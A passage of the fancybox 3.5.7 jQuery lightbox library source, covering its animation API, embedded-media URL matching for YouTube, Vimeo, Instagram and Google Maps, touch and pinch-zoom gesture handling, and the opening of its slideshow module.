                "fancybox-show-infobar",
                !!(e.infobar && t.group.length > 1)
              )
              .toggleClass("fancybox-show-caption", !!t.$caption)
              .toggleClass(
                "fancybox-show-nav",
                !!(e.arrows && t.group.length > 1)
              )
              .toggleClass("fancybox-is-modal", !!e.modal);
        },
        toggleControls: function () {
          this.hasHiddenControls ? this.showControls() : this.hideControls();
        },
      }),
        (n.fancybox = {
          version: "3.5.7",
          defaults: l,
          getInstance: function (t) {
            var e = n(
                '.fancybox-container:not(".fancybox-is-closing"):last'
              ).data("FancyBox"),
              i = Array.prototype.slice.call(arguments, 1);
            return (
              e instanceof y &&
              ("string" === n.type(t)
                ? e[t].apply(e, i)
                : "function" === n.type(t) && t.apply(e, i),
              e)
            );
          },
          open: function (t, e, n) {
            return new y(t, e, n);
          },
          close: function (t) {
            var e = this.getInstance();
            e && (e.close(), !0 === t && this.close(t));
          },
          destroy: function () {
            this.close(!0), d.add("body").off("click.fb-start", "**");
          },
          isMobile:
            /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
              navigator.userAgent
            ),
          use3d:
            ((a = e.createElement("div")),
            t.getComputedStyle &&
              t.getComputedStyle(a) &&
              t.getComputedStyle(a).getPropertyValue("transform") &&
              !(e.documentMode && e.documentMode < 11)),
          getTranslate: function (t) {
            var e;
            return (
              !!t &&
              !!t.length && {
                top: (e = t[0].getBoundingClientRect()).top || 0,
                left: e.left || 0,
                width: e.width,
                height: e.height,
                opacity: parseFloat(t.css("opacity")),
              }
            );
          },
          setTranslate: function (t, e) {
            var n = "",
              o = {};
            if (t && e)
              return (
                (i !== e.left || i !== e.top) &&
                  ((n =
                    (i === e.left ? t.position().left : e.left) +
                    "px, " +
                    (i === e.top ? t.position().top : e.top) +
                    "px"),
                  (n = this.use3d
                    ? "translate3d(" + n + ", 0px)"
                    : "translate(" + n + ")")),
                i !== e.scaleX && i !== e.scaleY
                  ? (n += " scale(" + e.scaleX + ", " + e.scaleY + ")")
                  : i !== e.scaleX && (n += " scaleX(" + e.scaleX + ")"),
                n.length && (o.transform = n),
                i !== e.opacity && (o.opacity = e.opacity),
                i !== e.width && (o.width = e.width),
                i !== e.height && (o.height = e.height),
                t.css(o)
              );
          },
          animate: function (t, e, o, s, r) {
            var a,
              l = this;
            n.isFunction(o) && ((s = o), (o = null)),
              l.stop(t),
              (a = l.getTranslate(t)),
              t.on(h, function (c) {
                (!c ||
                  !c.originalEvent ||
                  (t.is(c.originalEvent.target) &&
                    "z-index" != c.originalEvent.propertyName)) &&
                  (l.stop(t),
                  n.isNumeric(o) && t.css("transition-duration", ""),
                  n.isPlainObject(e)
                    ? i !== e.scaleX &&
                      i !== e.scaleY &&
                      l.setTranslate(t, {
                        top: e.top,
                        left: e.left,
                        width: a.width * e.scaleX,
                        height: a.height * e.scaleY,
                        scaleX: 1,
                        scaleY: 1,
                      })
                    : !0 !== r && t.removeClass(e),
                  n.isFunction(s) && s(c));
              }),
              n.isNumeric(o) && t.css("transition-duration", o + "ms"),
              n.isPlainObject(e)
                ? (i !== e.scaleX &&
                    i !== e.scaleY &&
                    (delete e.width,
                    delete e.height,
                    t.parent().hasClass("fancybox-slide--image") &&
                      t.parent().addClass("fancybox-is-scaling")),
                  n.fancybox.setTranslate(t, e))
                : t.addClass(e),
              t.data(
                "timer",
                setTimeout(function () {
                  t.trigger(h);
                }, o + 33)
              );
          },
          stop: function (t, e) {
            t &&
              t.length &&
              (clearTimeout(t.data("timer")),
              e && t.trigger(h),
              t.off(h).css("transition-duration", ""),
              t.parent().removeClass("fancybox-is-scaling"));
          },
        }),
        (n.fn.fancybox = function (t) {
          var e;
          return (
            (e = (t = t || {}).selector || !1)
              ? n("body")
                  .off("click.fb-start", e)
                  .on("click.fb-start", e, { options: t }, b)
              : this.off("click.fb-start").on(
                  "click.fb-start",
                  { items: this, options: t },
                  b
                ),
            this
          );
        }),
        d.on("click.fb-start", "[data-fancybox]", b),
        d.on("click.fb-start", "[data-fancybox-trigger]", function (t) {
          n('[data-fancybox="' + n(this).attr("data-fancybox-trigger") + '"]')
            .eq(n(this).attr("data-fancybox-index") || 0)
            .trigger("click.fb-start", { $trigger: n(this) });
        }),
        (o = ".fancybox-button"),
        (s = "fancybox-focus"),
        (r = null),
        d.on("mousedown mouseup focus blur", o, function (t) {
          switch (t.type) {
            case "mousedown":
              r = n(this);
              break;
            case "mouseup":
              r = null;
              break;
            case "focusin":
              n(o).removeClass(s),
                n(this).is(r) ||
                  n(this).is("[disabled]") ||
                  n(this).addClass(s);
              break;
            case "focusout":
              n(o).removeClass(s);
          }
        });
    }
    function b(t, e) {
      var i,
        o,
        s,
        r = [],
        a = 0;
      !(t && t.isDefaultPrevented()) &&
        (t.preventDefault(),
        (e = e || {}),
        t && t.data && (e = v(t.data.options, e)),
        (i = e.$target || n(t.currentTarget).trigger("blur")),
        ((s = n.fancybox.getInstance()) && s.$trigger && s.$trigger.is(i)) ||
          ((r = e.selector
            ? n(e.selector)
            : (o = i.attr("data-fancybox") || "")
            ? (r = t.data ? t.data.items : []).length
              ? r.filter('[data-fancybox="' + o + '"]')
              : n('[data-fancybox="' + o + '"]')
            : [i]),
          (a = n(r).index(i)) < 0 && (a = 0),
          ((s = n.fancybox.open(r, e, a)).$trigger = i)));
    }
  })(window, document, jQuery),
  (function (t) {
    var e = {
        youtube: {
          matcher:
            /(youtube\.com|youtu\.be|youtube\-nocookie\.com)\/(watch\?(.*&)?v=|v\/|u\/|embed\/?)?(videoseries\?list=(.*)|[\w-]{11}|\?listType=(.*)&list=(.*))(.*)/i,
          params: {
            autoplay: 1,
            autohide: 1,
            fs: 1,
            rel: 0,
            hd: 1,
            wmode: "transparent",
            enablejsapi: 1,
            html5: 1,
          },
          paramPlace: 8,
          type: "iframe",
          url: "https://www.youtube-nocookie.com/embed/$4",
          thumb: "https://img.youtube.com/vi/$4/hqdefault.jpg",
        },
        vimeo: {
          matcher: /^.+vimeo.com\/(.*\/)?([\d]+)(.*)?/,
          params: {
            autoplay: 1,
            hd: 1,
            show_title: 1,
            show_byline: 1,
            show_portrait: 0,
            fullscreen: 1,
          },
          paramPlace: 3,
          type: "iframe",
          url: "//player.vimeo.com/video/$2",
        },
        instagram: {
          matcher: /(instagr\.am|instagram\.com)\/p\/([a-zA-Z0-9_\-]+)\/?/i,
          type: "image",
          url: "//$1/p/$2/media/?size=l",
        },
        gmap_place: {
          matcher:
            /(maps\.)?google\.([a-z]{2,3}(\.[a-z]{2})?)\/(((maps\/(place\/(.*)\/)?\@(.*),(\d+.?\d+?)z))|(\?ll=))(.*)?/i,
          type: "iframe",
          url: function (t) {
            return (
              "//maps.google." +
              t[2] +
              "/?ll=" +
              (t[9]
                ? t[9] +
                  "&z=" +
                  Math.floor(t[10]) +
                  (t[12] ? t[12].replace(/^\//, "&") : "")
                : t[12] + ""
              ).replace(/\?/, "&") +
              "&output=" +
              (t[12] && t[12].indexOf("layer=c") > 0 ? "svembed" : "embed")
            );
          },
        },
        gmap_search: {
          matcher:
            /(maps\.)?google\.([a-z]{2,3}(\.[a-z]{2})?)\/(maps\/search\/)(.*)/i,
          type: "iframe",
          url: function (t) {
            return (
              "//maps.google." +
              t[2] +
              "/maps?q=" +
              t[5].replace("query=", "q=").replace("api=1", "") +
              "&output=embed"
            );
          },
        },
      },
      n = function (e, n, i) {
        if (e)
          return (
            (i = i || ""),
            "object" === t.type(i) && (i = t.param(i, !0)),
            t.each(n, function (t, n) {
              e = e.replace("$" + t, n || "");
            }),
            i.length && (e += (e.indexOf("?") > 0 ? "&" : "?") + i),
            e
          );
      };
    t(document).on("objectNeedsType.fb", function (i, o, s) {
      var r,
        a,
        l,
        c,
        d,
        u,
        p,
        f = s.src || "",
        h = !1;
      (r = t.extend(!0, {}, e, s.opts.media)),
        t.each(r, function (e, i) {
          if ((l = f.match(i.matcher))) {
            if (
              ((h = i.type), (p = e), (u = {}), i.paramPlace && l[i.paramPlace])
            ) {
              "?" == (d = l[i.paramPlace])[0] && (d = d.substring(1)),
                (d = d.split("&"));
              for (var o = 0; o < d.length; ++o) {
                var r = d[o].split("=", 2);
                2 == r.length &&
                  (u[r[0]] = decodeURIComponent(r[1].replace(/\+/g, " ")));
              }
            }
            return (
              (c = t.extend(!0, {}, i.params, s.opts[e], u)),
              (f =
                "function" === t.type(i.url)
                  ? i.url.call(this, l, c, s)
                  : n(i.url, l, c)),
              (a =
                "function" === t.type(i.thumb)
                  ? i.thumb.call(this, l, c, s)
                  : n(i.thumb, l)),
              "youtube" === e
                ? (f = f.replace(/&t=((\d+)m)?(\d+)s/, function (t, e, n, i) {
                    return (
                      "&start=" +
                      ((n ? 60 * parseInt(n, 10) : 0) + parseInt(i, 10))
                    );
                  }))
                : "vimeo" === e && (f = f.replace("&%23", "#")),
              !1
            );
          }
        }),
        h
          ? (s.opts.thumb ||
              (s.opts.$thumb && s.opts.$thumb.length) ||
              (s.opts.thumb = a),
            "iframe" === h &&
              (s.opts = t.extend(!0, s.opts, {
                iframe: { preload: !1, attr: { scrolling: "no" } },
              })),
            t.extend(s, {
              type: h,
              src: f,
              origSrc: s.src,
              contentSource: p,
              contentType:
                "image" === h
                  ? "image"
                  : "gmap_place" == p || "gmap_search" == p
                  ? "map"
                  : "video",
            }))
          : f && (s.type = s.opts.defaultType);
    });
    var i = {
      youtube: {
        src: "https://www.youtube.com/iframe_api",
        class: "YT",
        loading: !1,
        loaded: !1,
      },
      vimeo: {
        src: "https://player.vimeo.com/api/player.js",
        class: "Vimeo",
        loading: !1,
        loaded: !1,
      },
      load: function (t) {
        var e,
          n = this;
        if (this[t].loaded) {
          setTimeout(function () {
            n.done(t);
          });
          return;
        }
        this[t].loading ||
          ((this[t].loading = !0),
          ((e = document.createElement("script")).type = "text/javascript"),
          (e.src = this[t].src),
          "youtube" === t
            ? (window.onYouTubeIframeAPIReady = function () {
                (n[t].loaded = !0), n.done(t);
              })
            : (e.onload = function () {
                (n[t].loaded = !0), n.done(t);
              }),
          document.body.appendChild(e));
      },
      done: function (e) {
        var n, i, o;
        "youtube" === e && delete window.onYouTubeIframeAPIReady,
          (n = t.fancybox.getInstance()) &&
            ((i = n.current.$content.find("iframe")),
            "youtube" === e && void 0 !== YT && YT
              ? (o = new YT.Player(i.attr("id"), {
                  events: {
                    onStateChange: function (t) {
                      0 == t.data && n.next();
                    },
                  },
                }))
              : "vimeo" === e &&
                void 0 !== Vimeo &&
                Vimeo &&
                (o = new Vimeo.Player(i)).on("ended", function () {
                  n.next();
                }));
      },
    };
    t(document).on({
      "afterShow.fb": function (t, e, n) {
        e.group.length > 1 &&
          ("youtube" === n.contentSource || "vimeo" === n.contentSource) &&
          i.load(n.contentSource);
      },
    });
  })(jQuery),
  (function (t, e, n) {
    var i =
        t.requestAnimationFrame ||
        t.webkitRequestAnimationFrame ||
        t.mozRequestAnimationFrame ||
        t.oRequestAnimationFrame ||
        function (e) {
          return t.setTimeout(e, 1e3 / 60);
        },
      o =
        t.cancelAnimationFrame ||
        t.webkitCancelAnimationFrame ||
        t.mozCancelAnimationFrame ||
        t.oCancelAnimationFrame ||
        function (e) {
          t.clearTimeout(e);
        },
      s = function (e) {
        var n = [];
        for (var i in (e =
          (e = e.originalEvent || e || t.e).touches && e.touches.length
            ? e.touches
            : e.changedTouches && e.changedTouches.length
            ? e.changedTouches
            : [e]))
          e[i].pageX
            ? n.push({ x: e[i].pageX, y: e[i].pageY })
            : e[i].clientX && n.push({ x: e[i].clientX, y: e[i].clientY });
        return n;
      },
      r = function (t, e, n) {
        return e && t
          ? "x" === n
            ? t.x - e.x
            : "y" === n
            ? t.y - e.y
            : Math.sqrt(Math.pow(t.x - e.x, 2) + Math.pow(t.y - e.y, 2))
          : 0;
      },
      a = function (t) {
        if (
          t.is(
            'a,area,button,[role="button"],input,label,select,summary,textarea,video,audio,iframe'
          ) ||
          n.isFunction(t.get(0).onclick) ||
          t.data("selectable")
        )
          return !0;
        for (var e = 0, i = t[0].attributes, o = i.length; e < o; e++)
          if ("data-fancybox-" === i[e].nodeName.substr(0, 14)) return !0;
        return !1;
      },
      l = function (e) {
        var n = t.getComputedStyle(e)["overflow-y"],
          i = t.getComputedStyle(e)["overflow-x"],
          o =
            ("scroll" === n || "auto" === n) && e.scrollHeight > e.clientHeight,
          s = ("scroll" === i || "auto" === i) && e.scrollWidth > e.clientWidth;
        return o || s;
      },
      c = function (t) {
        for (
          var e = !1;
          !(
            (e = l(t.get(0))) ||
            !(t = t.parent()).length ||
            t.hasClass("fancybox-stage") ||
            t.is("body")
          );

        );
        return e;
      },
      d = function (t) {
        var e = this;
        (e.instance = t),
          (e.$bg = t.$refs.bg),
          (e.$stage = t.$refs.stage),
          (e.$container = t.$refs.container),
          e.destroy(),
          e.$container.on(
            "touchstart.fb.touch mousedown.fb.touch",
            n.proxy(e, "ontouchstart")
          );
      };
    (d.prototype.destroy = function () {
      var t = this;
      t.$container.off(".fb.touch"),
        n(e).off(".fb.touch"),
        t.requestId && (o(t.requestId), (t.requestId = null)),
        t.tapped && (clearTimeout(t.tapped), (t.tapped = null));
    }),
      (d.prototype.ontouchstart = function (i) {
        var o = this,
          l = n(i.target),
          d = o.instance,
          u = d.current,
          p = u.$slide,
          f = u.$content,
          h = "touchstart" == i.type;
        if (
          (h && o.$container.off("mousedown.fb.touch"),
          !(
            (i.originalEvent && 2 == i.originalEvent.button) ||
            !p.length ||
            !l.length ||
            a(l) ||
            a(l.parent())
          ) &&
            (l.is("img") ||
              !(i.originalEvent.clientX > l[0].clientWidth + l.offset().left)))
        ) {
          if (!u || d.isAnimating || u.$slide.hasClass("fancybox-animated")) {
            i.stopPropagation(), i.preventDefault();
            return;
          }
          (o.realPoints = o.startPoints = s(i)),
            o.startPoints.length &&
              (u.touch && i.stopPropagation(),
              (o.startEvent = i),
              (o.canTap = !0),
              (o.$target = l),
              (o.$content = f),
              (o.opts = u.opts.touch),
              (o.isPanning = !1),
              (o.isSwiping = !1),
              (o.isZooming = !1),
              (o.isScrolling = !1),
              (o.canPan = d.canPan()),
              (o.startTime = new Date().getTime()),
              (o.distanceX = o.distanceY = o.distance = 0),
              (o.canvasWidth = Math.round(p[0].clientWidth)),
              (o.canvasHeight = Math.round(p[0].clientHeight)),
              (o.contentLastPos = null),
              (o.contentStartPos = n.fancybox.getTranslate(o.$content) || {
                top: 0,
                left: 0,
              }),
              (o.sliderStartPos = n.fancybox.getTranslate(p)),
              (o.stagePos = n.fancybox.getTranslate(d.$refs.stage)),
              (o.sliderStartPos.top -= o.stagePos.top),
              (o.sliderStartPos.left -= o.stagePos.left),
              (o.contentStartPos.top -= o.stagePos.top),
              (o.contentStartPos.left -= o.stagePos.left),
              n(e)
                .off(".fb.touch")
                .on(
                  h
                    ? "touchend.fb.touch touchcancel.fb.touch"
                    : "mouseup.fb.touch mouseleave.fb.touch",
                  n.proxy(o, "ontouchend")
                )
                .on(
                  h ? "touchmove.fb.touch" : "mousemove.fb.touch",
                  n.proxy(o, "ontouchmove")
                ),
              n.fancybox.isMobile &&
                e.addEventListener("scroll", o.onscroll, !0),
              (((o.opts || o.canPan) &&
                (l.is(o.$stage) || o.$stage.find(l).length)) ||
                (l.is(".fancybox-image") && i.preventDefault(),
                n.fancybox.isMobile &&
                  l.parents(".fancybox-caption").length)) &&
                ((o.isScrollable = c(l) || c(l.parent())),
                (n.fancybox.isMobile && o.isScrollable) || i.preventDefault(),
                (1 === o.startPoints.length || u.hasError) &&
                  (o.canPan
                    ? (n.fancybox.stop(o.$content), (o.isPanning = !0))
                    : (o.isSwiping = !0),
                  o.$container.addClass("fancybox-is-grabbing")),
                2 === o.startPoints.length &&
                  "image" === u.type &&
                  (u.isLoaded || u.$ghost) &&
                  ((o.canTap = !1),
                  (o.isSwiping = !1),
                  (o.isPanning = !1),
                  (o.isZooming = !0),
                  n.fancybox.stop(o.$content),
                  (o.centerPointStartX =
                    (o.startPoints[0].x + o.startPoints[1].x) * 0.5 -
                    n(t).scrollLeft()),
                  (o.centerPointStartY =
                    (o.startPoints[0].y + o.startPoints[1].y) * 0.5 -
                    n(t).scrollTop()),
                  (o.percentageOfImageAtPinchPointX =
                    (o.centerPointStartX - o.contentStartPos.left) /
                    o.contentStartPos.width),
                  (o.percentageOfImageAtPinchPointY =
                    (o.centerPointStartY - o.contentStartPos.top) /
                    o.contentStartPos.height),
                  (o.startDistanceBetweenFingers = r(
                    o.startPoints[0],
                    o.startPoints[1]
                  )))));
        }
      }),
      (d.prototype.onscroll = function (t) {
        var n = this;
        (n.isScrolling = !0), e.removeEventListener("scroll", n.onscroll, !0);
      }),
      (d.prototype.ontouchmove = function (t) {
        var e = this;
        if (
          void 0 !== t.originalEvent.buttons &&
          0 === t.originalEvent.buttons
        ) {
          e.ontouchend(t);
          return;
        }
        if (e.isScrolling) {
          e.canTap = !1;
          return;
        }
        (e.newPoints = s(t)),
          (e.opts || e.canPan) &&
            e.newPoints.length &&
            e.newPoints.length &&
            ((e.isSwiping && !0 === e.isSwiping) || t.preventDefault(),
            (e.distanceX = r(e.newPoints[0], e.startPoints[0], "x")),
            (e.distanceY = r(e.newPoints[0], e.startPoints[0], "y")),
            (e.distance = r(e.newPoints[0], e.startPoints[0])),
            e.distance > 0 &&
              (e.isSwiping
                ? e.onSwipe(t)
                : e.isPanning
                ? e.onPan()
                : e.isZooming && e.onZoom()));
      }),
      (d.prototype.onSwipe = function (e) {
        var s,
          r = this,
          a = r.instance,
          l = r.isSwiping,
          c = r.sliderStartPos.left || 0;
        if (!0 === l) {
          if (Math.abs(r.distance) > 10) {
            if (
              ((r.canTap = !1),
              a.group.length < 2 && r.opts.vertical
                ? (r.isSwiping = "y")
                : a.isDragging ||
                  !1 === r.opts.vertical ||
                  ("auto" === r.opts.vertical && n(t).width() > 800)
                ? (r.isSwiping = "x")
                : ((s = Math.abs(
                    (180 * Math.atan2(r.distanceY, r.distanceX)) / Math.PI
                  )),
                  (r.isSwiping = s > 45 && s < 135 ? "y" : "x")),
              "y" === r.isSwiping && n.fancybox.isMobile && r.isScrollable)
            ) {
              r.isScrolling = !0;
              return;
            }
            (a.isDragging = r.isSwiping),
              (r.startPoints = r.newPoints),
              n.each(a.slides, function (t, e) {
                var i, o;
                n.fancybox.stop(e.$slide),
                  (i = n.fancybox.getTranslate(e.$slide)),
                  (o = n.fancybox.getTranslate(a.$refs.stage)),
                  e.$slide
                    .css({
                      transform: "",
                      opacity: "",
                      "transition-duration": "",
                    })
                    .removeClass("fancybox-animated")
                    .removeClass(function (t, e) {
                      return (e.match(/(^|\s)fancybox-fx-\S+/g) || []).join(
                        " "
                      );
                    }),
                  e.pos === a.current.pos &&
                    ((r.sliderStartPos.top = i.top - o.top),
                    (r.sliderStartPos.left = i.left - o.left)),
                  n.fancybox.setTranslate(e.$slide, {
                    top: i.top - o.top,
                    left: i.left - o.left,
                  });
              }),
              a.SlideShow && a.SlideShow.isActive && a.SlideShow.stop();
          }
          return;
        }
        "x" == l &&
          (r.distanceX > 0 &&
          (r.instance.group.length < 2 ||
            (0 === r.instance.current.index && !r.instance.current.opts.loop))
            ? (c += Math.pow(r.distanceX, 0.8))
            : r.distanceX < 0 &&
              (r.instance.group.length < 2 ||
                (r.instance.current.index === r.instance.group.length - 1 &&
                  !r.instance.current.opts.loop))
            ? (c -= Math.pow(-r.distanceX, 0.8))
            : (c += r.distanceX)),
          (r.sliderLastPos = {
            top: "x" == l ? 0 : r.sliderStartPos.top + r.distanceY,
            left: c,
          }),
          r.requestId && (o(r.requestId), (r.requestId = null)),
          (r.requestId = i(function () {
            r.sliderLastPos &&
              (n.each(r.instance.slides, function (t, e) {
                var i = e.pos - r.instance.currPos;
                n.fancybox.setTranslate(e.$slide, {
                  top: r.sliderLastPos.top,
                  left:
                    r.sliderLastPos.left +
                    i * r.canvasWidth +
                    i * e.opts.gutter,
                });
              }),
              r.$container.addClass("fancybox-is-sliding"));
          }));
      }),
      (d.prototype.onPan = function () {
        var t = this;
        if (
          r(t.newPoints[0], t.realPoints[0]) < (n.fancybox.isMobile ? 10 : 5)
        ) {
          t.startPoints = t.newPoints;
          return;
        }
        (t.canTap = !1),
          (t.contentLastPos = t.limitMovement()),
          t.requestId && o(t.requestId),
          (t.requestId = i(function () {
            n.fancybox.setTranslate(t.$content, t.contentLastPos);
          }));
      }),
      (d.prototype.limitMovement = function () {
        var t,
          e,
          n,
          i,
          o,
          s,
          r = this.canvasWidth,
          a = this.canvasHeight,
          l = this.distanceX,
          c = this.distanceY,
          d = this.contentStartPos,
          u = d.left,
          p = d.top,
          f = d.width,
          h = d.height;
        return (
          (o = f > r ? u + l : u),
          (s = p + c),
          (t = Math.max(0, 0.5 * r - 0.5 * f)),
          (e = Math.max(0, 0.5 * a - 0.5 * h)),
          (n = Math.min(r - f, 0.5 * r - 0.5 * f)),
          (i = Math.min(a - h, 0.5 * a - 0.5 * h)),
          l > 0 && o > t && (o = t - 1 + Math.pow(-t + u + l, 0.8) || 0),
          l < 0 && o < n && (o = n + 1 - Math.pow(n - u - l, 0.8) || 0),
          c > 0 && s > e && (s = e - 1 + Math.pow(-e + p + c, 0.8) || 0),
          c < 0 && s < i && (s = i + 1 - Math.pow(i - p - c, 0.8) || 0),
          { top: s, left: o }
        );
      }),
      (d.prototype.limitPosition = function (t, e, n, i) {
        var o = this.canvasWidth,
          s = this.canvasHeight;
        return (
          (t =
            n > o
              ? (t = t > 0 ? 0 : t) < o - n
                ? o - n
                : t
              : Math.max(0, o / 2 - n / 2)),
          {
            top: (e =
              i > s
                ? (e = e > 0 ? 0 : e) < s - i
                  ? s - i
                  : e
                : Math.max(0, s / 2 - i / 2)),
            left: t,
          }
        );
      }),
      (d.prototype.onZoom = function () {
        var e = this,
          s = e.contentStartPos,
          a = s.width,
          l = s.height,
          c = s.left,
          d = s.top,
          u = r(e.newPoints[0], e.newPoints[1]) / e.startDistanceBetweenFingers,
          p = Math.floor(a * u),
          f = Math.floor(l * u),
          h = (a - p) * e.percentageOfImageAtPinchPointX,
          g = (l - f) * e.percentageOfImageAtPinchPointY,
          v = (e.newPoints[0].x + e.newPoints[1].x) / 2 - n(t).scrollLeft(),
          m = (e.newPoints[0].y + e.newPoints[1].y) / 2 - n(t).scrollTop(),
          y = v - e.centerPointStartX,
          b = m - e.centerPointStartY;
        (e.canTap = !1),
          (e.newWidth = p),
          (e.newHeight = f),
          (e.contentLastPos = {
            top: d + (g + b),
            left: c + (h + y),
            scaleX: u,
            scaleY: u,
          }),
          e.requestId && o(e.requestId),
          (e.requestId = i(function () {
            n.fancybox.setTranslate(e.$content, e.contentLastPos);
          }));
      }),
      (d.prototype.ontouchend = function (t) {
        var i = this,
          r = i.isSwiping,
          a = i.isPanning,
          l = i.isZooming,
          c = i.isScrolling;
        if (
          ((i.endPoints = s(t)),
          (i.dMs = Math.max(new Date().getTime() - i.startTime, 1)),
          i.$container.removeClass("fancybox-is-grabbing"),
          n(e).off(".fb.touch"),
          e.removeEventListener("scroll", i.onscroll, !0),
          i.requestId && (o(i.requestId), (i.requestId = null)),
          (i.isSwiping = !1),
          (i.isPanning = !1),
          (i.isZooming = !1),
          (i.isScrolling = !1),
          (i.instance.isDragging = !1),
          i.canTap)
        )
          return i.onTap(t);
        (i.speed = 100),
          (i.velocityX = (i.distanceX / i.dMs) * 0.5),
          (i.velocityY = (i.distanceY / i.dMs) * 0.5),
          a ? i.endPanning() : l ? i.endZooming() : i.endSwiping(r, c);
      }),
      (d.prototype.endSwiping = function (t, e) {
        var i = this,
          o = !1,
          s = i.instance.group.length,
          r = Math.abs(i.distanceX),
          a = "x" == t && s > 1 && ((i.dMs > 130 && r > 10) || r > 50);
        (i.sliderLastPos = null),
          "y" == t && !e && Math.abs(i.distanceY) > 50
            ? (n.fancybox.animate(
                i.instance.current.$slide,
                {
                  top: i.sliderStartPos.top + i.distanceY + 150 * i.velocityY,
                  opacity: 0,
                },
                200
              ),
              (o = i.instance.close(!0, 250)))
            : a && i.distanceX > 0
            ? (o = i.instance.previous(300))
            : a && i.distanceX < 0 && (o = i.instance.next(300)),
          !1 === o && ("x" == t || "y" == t) && i.instance.centerSlide(200),
          i.$container.removeClass("fancybox-is-sliding");
      }),
      (d.prototype.endPanning = function () {
        var t, e, i;
        this.contentLastPos &&
          (!1 === this.opts.momentum || this.dMs > 350
            ? ((t = this.contentLastPos.left), (e = this.contentLastPos.top))
            : ((t = this.contentLastPos.left + 500 * this.velocityX),
              (e = this.contentLastPos.top + 500 * this.velocityY)),
          ((i = this.limitPosition(
            t,
            e,
            this.contentStartPos.width,
            this.contentStartPos.height
          )).width = this.contentStartPos.width),
          (i.height = this.contentStartPos.height),
          n.fancybox.animate(this.$content, i, 366));
      }),
      (d.prototype.endZooming = function () {
        var t,
          e,
          i,
          o,
          s = this.instance.current,
          r = this.newWidth,
          a = this.newHeight;
        this.contentLastPos &&
          ((t = this.contentLastPos.left),
          (o = {
            top: (e = this.contentLastPos.top),
            left: t,
            width: r,
            height: a,
            scaleX: 1,
            scaleY: 1,
          }),
          n.fancybox.setTranslate(this.$content, o),
          r < this.canvasWidth && a < this.canvasHeight
            ? this.instance.scaleToFit(150)
            : r > s.width || a > s.height
            ? this.instance.scaleToActual(
                this.centerPointStartX,
                this.centerPointStartY,
                150
              )
            : ((i = this.limitPosition(t, e, r, a)),
              n.fancybox.animate(this.$content, i, 150)));
      }),
      (d.prototype.onTap = function (e) {
        var i,
          o = this,
          r = n(e.target),
          a = o.instance,
          l = a.current,
          c = (e && s(e)) || o.startPoints,
          d = c[0] ? c[0].x - n(t).scrollLeft() - o.stagePos.left : 0,
          u = c[0] ? c[0].y - n(t).scrollTop() - o.stagePos.top : 0,
          p = function (t) {
            var i = l.opts[t];
            if ((n.isFunction(i) && (i = i.apply(a, [l, e])), i))
              switch (i) {
                case "close":
                  a.close(o.startEvent);
                  break;
                case "toggleControls":
                  a.toggleControls();
                  break;
                case "next":
                  a.next();
                  break;
                case "nextOrClose":
                  a.group.length > 1 ? a.next() : a.close(o.startEvent);
                  break;
                case "zoom":
                  "image" == l.type &&
                    (l.isLoaded || l.$ghost) &&
                    (a.canPan()
                      ? a.scaleToFit()
                      : a.isScaledDown()
                      ? a.scaleToActual(d, u)
                      : a.group.length < 2 && a.close(o.startEvent));
              }
          };
        if (
          (!e.originalEvent || 2 != e.originalEvent.button) &&
          (r.is("img") || !(d > r[0].clientWidth + r.offset().left))
        ) {
          if (
            r.is(
              ".fancybox-bg,.fancybox-inner,.fancybox-outer,.fancybox-container"
            )
          )
            i = "Outside";
          else if (r.is(".fancybox-slide")) i = "Slide";
          else {
            if (
              !a.current.$content ||
              !a.current.$content.find(r).addBack().filter(r).length
            )
              return;
            i = "Content";
          }
          if (o.tapped) {
            if (
              (clearTimeout(o.tapped),
              (o.tapped = null),
              Math.abs(d - o.tapX) > 50 || Math.abs(u - o.tapY) > 50)
            )
              return this;
            p("dblclick" + i);
          } else
            (o.tapX = d),
              (o.tapY = u),
              l.opts["dblclick" + i] &&
              l.opts["dblclick" + i] !== l.opts["click" + i]
                ? (o.tapped = setTimeout(function () {
                    (o.tapped = null), a.isAnimating || p("click" + i);
                  }, 500))
                : p("click" + i);
          return this;
        }
      }),
      n(e)
        .on("onActivate.fb", function (t, e) {
          e && !e.Guestures && (e.Guestures = new d(e));
        })
        .on("beforeClose.fb", function (t, e) {
          e && e.Guestures && e.Guestures.destroy();
        });
  })(window, document, jQuery),
  (function (t, e) {
    e.extend(!0, e.fancybox.defaults, {
      btnTpl: {
        slideShow:
          '<button data-fancybox-play class="fancybox-button fancybox-button--play" title="{{PLAY_START}}"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 5.4v13.2l11-6.6z"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.33 5.75h2.2v12.5h-2.2V5.75zm5.15 0h2.2v12.5h-2.2V5.75z"/></svg></button>',
      },
      slideShow: { autoStart: !1, speed: 3e3, progress: !0 },
    });
    var n = function (t) {
      (this.instance = t), this.init();
    };
    e.extend(n.prototype, {
      timer: null,
      isActive: !1,
      $button: null,
      init: function () {
        var t = this,
          n = t.instance,
          i = n.group[n.currIndex].opts.slideShow;
        (t.$button = n.$refs.toolbar
          .find("[data-fancybox-play]")
          .on("click", function () {
            t.toggle();
          })),
          n.group.length < 2 || !i
            ? t.$button.hide()
            : i.progress &&
              (t.$progress = e(
                '<div class="fancybox-progress"></div>'
              ).appendTo(n.$refs.inner));
      },
      set: function (t) {
        var n = this,
          i = n.instance,
          o = i.current;
        o && (!0 === t || o.opts.loop || i.currIndex < i.group.length - 1)
          ? n.isActive &&
            "video" !== o.contentType &&
            (n.$progress &&
              e.fancybox.animate(
                n.$progress.show(),
                { scaleX: 1 },
                o.opts.slideShow.speed
              ),
            (n.timer = setTimeout(function () {
              i.current.opts.loop || i.current.index != i.group.length - 1
                ? i.next()
                : i.jumpTo(0);
            }, o.opts.slideShow.speed)))
          : (n.stop(), (i.idleSecondsCounter = 0), i.showControls());
      },
      clear: function () {
        var t = this;
        clearTimeout(t.timer),
          (t.timer = null),
          t.$progress && t.$progress.removeAttr("style").hide();
      },
      start: function () {
        var t = this,
          e = t.instance.current;
        e &&
          (t.$button
            .attr(
              "title",
              (e.opts.i18n[e.opts.lang] || e.opts.i18n.en).PLAY_STOP
            )
            .removeClass("fancybox-button--play")
            .addClass("fancybox-button--pause"),
          (t.isActive = !0),
          e.isComplete && t.set(!0),
          t.instance.trigger("onSlideShowChange", !0));
      },
      stop: function () {
        var t = this,
          e = t.instance.current;
        t.clear(),
          t.$button
            .attr(
              "title",
